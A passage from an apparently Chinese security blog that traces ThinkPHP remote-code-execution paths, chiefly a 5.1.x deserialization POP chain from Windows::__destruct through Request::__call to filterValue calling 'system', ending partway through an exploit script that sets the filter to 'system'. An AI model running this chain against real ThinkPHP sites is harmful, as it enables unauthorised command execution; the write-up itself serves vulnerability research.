class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为这里我们传入的method方法的参数为True，所以直接进入了第一个If然后就return值了，下面之前我们之前利用过的漏洞点是进不去的,也就是这个method方法实际上就是去获得我们的请求类型的，然后再回到param方法，接着向下走</p>
<p><a href="https://imgchr.com/i/eBWv0f" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBWv0f.png" alt="eBWv0f.png"></a></p>
<p>可以看到我们的method方法获得的值为post，然后通过switch跟进post方法，这里要注意看一下我们的参数是false，post方法代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;post)) &#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;input;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST) &amp;&amp; <span class="keyword">false</span> !== strpos(<span class="keyword">$this</span>-&gt;contentType(), <span class="string">'application/json'</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;post = (<span class="keyword">array</span>) json_decode($content, <span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;post = $_POST;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;param       = [];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;post = array_merge(<span class="keyword">$this</span>-&gt;post, $name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;post, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们是直接进入了else条件，给我们的post变量赋值了我们传入进去的post数组，接着跟进return的input方法，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取原始数据</span></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">        <span class="comment">// 解析name</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $type = <span class="string">'s'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 按.拆分成多维数组进行判断</span></span><br><span class="line">        <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">                $data = $data[$val];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 无输入数据，返回默认值</span></span><br><span class="line">                <span class="keyword">return</span> $default;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        reset($data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这里因为我们传入的是false，所以只能进入第一步if，返回了我们的$this-&gt;post。接着回到app类，继续跟进，这里将我们的$this-&gt;post的值赋给了我们的vars变量，下一步代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br></pre></td></tr></table></figure>

<p>这里给Request类中的$this-&gt;param进行了一次赋值，进行了数组合并，不过get和route都是空的，所以$this-&gt;param其实就是我们的post数组，接着向下跟进，再次调用了input方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure>

<p>继续跟进input方法，这次我们并没有false的阻碍，可以向下继续跟进</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB4Szj.png" alt="eB4Szj.png"></p>
<p>首先发现进入了getfilter方法，跟进一下，其实就是把我们的$this-&gt;filter赋值给filter。所以可见上图变量中的数据。接着跟进<code>array_walk_recursive</code>方法，看一下手册的描述</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB4gpQ.png" alt="eB4gpQ.png"></p>
<p>看一下例子就会很明白了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">$sweet = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="string">'apple'</span>, <span class="string">'b'</span> =&gt; <span class="string">'banana'</span>);</span><br><span class="line">$fruits = <span class="keyword">array</span>(<span class="string">'sweet'</span> =&gt; $sweet, <span class="string">'sour'</span> =&gt; <span class="string">'lemon'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_print</span><span class="params">($item, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$key holds $item\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array_walk_recursive($fruits, <span class="string">'test_print'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里调用的是filterValue方法，跟进看一下</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB4okT.png" alt="eB4okT.png"></p>
<p>这里看到了关键函数<code>call_user_func</code>，而且这个函数的两个参数我们还都可以控制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$value----<span class="keyword">$this</span>-&gt;param</span><br><span class="line"></span><br><span class="line">$filter----<span class="keyword">$this</span>-&gt;filter</span><br></pre></td></tr></table></figure>

<p>最终可以经过不断遍历达到命令执行的目的</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB5SAK.png" alt="eB5SAK.png"></p>
<p>最终如本文开头成功弹出计算器。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>攻击链如下</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBItsA.png" alt="eBItsA.png"></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp-5.1.x pop链分析</title>
    <url>/2019/10/08/Thinkphp-5-1-x-pop%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>似乎由N1ctf的5.2pop链引起了pop链挖掘狂潮，接下来就分析一下5.1.x的pop链。</p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p><img src="https://s2.ax1x.com/2019/10/07/u23DDH.png" alt="u23DDH.png"></p>
<h3 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h3><p><strong>起点 \thinkphp\library\think\process\pipes\Windows.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p><strong>跟进removeFiles函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在removeFiles中调用了file_exists函数对$filename进行处理，对于需要判断的文件名，file_exists函数会将其当作字符串处理，如果我们给$filename赋值为一个类，那么将触发__toString方法</p>
<p><strong>__toString跳板</strong></p>
<p>\thinkphp\library\think\model\concern\Conversion.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进toJson函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进toArray函数，这个函数代码比较多，只解析关键部分了。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            $relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">               $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">               <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                    $relation-&gt;visible($name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>寻找pop链的关键是最终找到可以进行危险操作的点，比如RCE点的寻找，pop链的寻找最终点一般落在__call方法</p>
<blockquote>
<p>一般PHP中的__call方法都是用来进行容错或者是动态调用,所以一般会在__call方法中使用</p>
<p>call_user_func($method, $args)</p>
<p>call_user_func_array([$obj,$method], $args)</p>
</blockquote>
<p>那么上面这个toArray函数正符合我们要触发的__call，触发点如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$relation-&gt;visible($name);</span><br></pre></td></tr></table></figure>

<p>我们需要为$relation找一个不存在visible方法的类，这样就可以成功触发__call方法了，那么该怎么去给$relation赋值呢，可以从上面的代码中看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">   $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br></pre></td></tr></table></figure>

<p>对于两个函数来说，$key的值就是append数组中的键值</p>
<p>先跟进getRelation函数</p>
<p><strong>\think\model\concern\RelationShip.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于这里的relation最后直接返回空了</p>
<p>跟进getAttr函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $notFound = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $notFound = <span class="keyword">true</span>;</span><br><span class="line">        $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进getData</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里把data数组中对应键值设置为Request类就行了</p>
<p>需要找到一个同时有Conversion和Attribute的类</p>
<p>很明显Model类符合这样的条件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>\thinkphp\library\think\Request.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">         array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">         <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这样我们就可以控制$args了，这里是通过$this-&gt;hook[$method]去调用函数的，我们只需要通过在hook数组中给visible键赋予对应的值就可以了，这样就实现了调用Request类中任意方法了，不过这里还通过array_unshift函数把$this放到了$args数组，如下图</p>
<p><img src="https://s2.ax1x.com/2019/10/07/uRaIFe.png" alt="uRaIFe.png"></p>
<p>所以最终的形式 Function($this,$args)，这种情况下很难去进行命令执行之类的操作的</p>
<p>看第一篇pop链的分析思路，这点解析的很好</p>
<blockquote>
<p>Request类中有一个特殊的功能就是过滤器 filter(ThinkPHP的多个远程代码执行都是出自此处)所以可以尝试覆盖filter的方法去执行代码寻找使用了过滤器的所有方法发现input()函数满足条件</p>
</blockquote>
<p>在上一篇的RCE分析中，我们发现input方法是一个很神奇的东西，很多thinkphp的rce都是通过input进行rce的，其实主要的触发点如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通过回调函数array_walk_recursive，调用filterValue</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 正则过滤</span></span><br><span class="line">                <span class="keyword">if</span> (!preg_match($filter, $value)) &#123;</span><br><span class="line">                    <span class="comment">// 匹配不成功返回默认值</span></span><br><span class="line">                    $value = $default;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>再通过我们覆盖的$filter变量进行RCE</p>
<p><strong>同样这里也是通过filtervalue进行rce的，但是这里我们只能控制$filter，向上跟进input</strong></p>
<p>这里有一个注意点,在input函数中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">    <span class="comment">// 获取原始数据</span></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$name = (string) $name;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>如果这里name传的是数组的话那么直接String将报错终止程序，所以我们不能直接调用input，继续向上找调用input的函数，可以发现param比较满足这个条件</p>
<p><strong>param函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在param函数中通过array_merge将get参数传给$this-&gt;param，在param中可以控制Input的第一个函数，但是我们还是没法控制$name，接着向上寻找调用param的函数，可以发现isAjax函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">    $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以很明显的看到我们可以控制param的第一个位置的参数，这样我们就可以控制input函数第二个位置的参数了，就达到了我们想要的目的，这样就可以避免数组转化字符串报错了，那么接着回到input函数中，通过调用getFilter函数将值赋给$filter，接着回调filtervalue</p>
<p><img src="https://s2.ax1x.com/2019/10/07/uR4M5j.png" alt="uR4M5j.png"></p>
<p><strong>最终通过循环调用到calc</strong></p>
<p><img src="https://s2.ax1x.com/2019/10/07/uR4xWn.png" alt="uR4xWn.png"></p>
<p>调用栈如下</p>
<p><img src="https://s2.ax1x.com/2019/10/07/uR5VY9.png" alt="uR5VY9.png"></p>
<p>调用链</p>
<p><img src="https://s2.ax1x.com/2019/10/08/uWalAU.png" alt="uWalAU.png"></p>
<p>照着知道创宇的exp魔改了一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"lihuaiqiu"</span>=&gt;[<span class="string">"1"</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"lihuaiqiu"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">'var_method'</span>       =&gt; <span class="string">'_method'</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">'var_pjax'</span>         =&gt; <span class="string">'_pjax'</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">'var_pathinfo'</span>     =&gt; <span class="string">'s'</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">'pathinfo_fetch'</span>   =&gt; [<span class="string">'ORIG_PATH_INFO'</span>, <span 